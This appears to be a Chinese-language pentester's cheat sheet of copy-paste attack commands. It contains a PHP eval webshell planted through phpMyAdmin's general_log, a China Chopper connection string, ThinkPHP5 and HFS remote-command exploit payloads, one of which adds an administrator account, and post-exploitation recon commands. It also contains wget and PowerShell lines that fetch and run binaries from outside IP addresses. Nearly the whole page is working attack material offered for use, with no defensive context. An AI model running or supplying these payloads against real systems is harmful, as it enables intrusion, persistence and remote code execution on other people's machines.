---
title: 常用复制粘贴
---


经常公布socks代理：[http://livesocksupdate.blogspot.com/](http://livesocksupdate.blogspot.com/)

pentesters arsenal tools:

- Metasploit
- Burp Suite
- w3af
- mitmproxy
- sqlmap
- Faraday
- fuzzdb
- radare2
- Nikto2
- nmap
- sublist3r

downloader常用方法如下：

·  certUtil
·  powershell
·  csc
·  vbs
·  JScript
·  hta
·  bitsadmin
·  wget
·  debug
·  ftp
·  ftfp

cmd 提权常用命令

    systeminfo | findstr OS #获取系统版本信息
    hostname  #获取主机名称
    whomai /priv  #显示当前用户的安全特权
    quser or query user  #获取在线用户
    netstat -ano | findstr 3389  #获取rdp连接来源IP
    dir c:\programdata\ #分析安装杀软
    wmic qfe get Caption,Description,HotFixID,InstalledOn  #列出已安装的补丁
    REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  #获取远程端口
    tasklist /svc | find "TermService" + netstat -ano  #获取远程端口

phpmyadmin general_log 添加webshell

    set global general_log = 1;
    set global general_log_file ='D:/phpStudy4IIS/WWW/phpmyadmin/aa.php';
    select '<?php eval($_REQUEST[123]);?>';
    set global general_log = 0;
    set global general_log_file =null;

菜刀添加数据库连接:

    <T>MYSQL</T><H>localhost</H><U>root</U><P>Unser251#</P><L>utf8</L>

certutil 下载:

    certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt

linux shell 下载执行：

    wget  http://100.100.100.0/aelf -O /tmp/a && chmod +x /tmp/a && setsid /tmp/a

thinkphp5 测漏洞:

    https://www.waitalone.cn/thinkphp-getshell.html
    
    /?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
    /?s=index/\think\Request/input&filter=phpinfo&data=-1

hfs 命令执行漏洞:

    ?search==%00{.exec|cmd.exe /c net user test1234 1234 /add.}    
    ?search==%00{.exec|cmd.exe /c net localgroup administrators test1234 /add.}

发包模拟tcp:

    iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP

powershell常用：

    打包:
    powershell -Command "Compress-Archive -LiteralPath D:\mt4mate\upfile\115   -DestinationPath  D:\mt4mate\upfile\115\a.zip"

    powershell -command "Add-Type -Assembly 'System.IO.Compression.FileSystem' ; [System.IO.Compression.ZipFile]::CreateFromDirectory('d:\1\upfile\115\images', 'd:\1\upfile\1.zip') ;"
    
    下载：
    powershell -Command "Invoke-WebRequest -Uri http://41.11.1.1/a.exe -OutFile     a.exe"

    删除文件：
    powershell -Command "Remove-Item a.exe -Force"

    执行默认功能：
    powershell -Command "Invoke-Item D:\mt4mate\upfile\115\a.exe"

XSS 字段:

    HTTP_X_FORWARDED_FOR
    HTTP_CLIENT_IP
    REMOTE_ADDR


















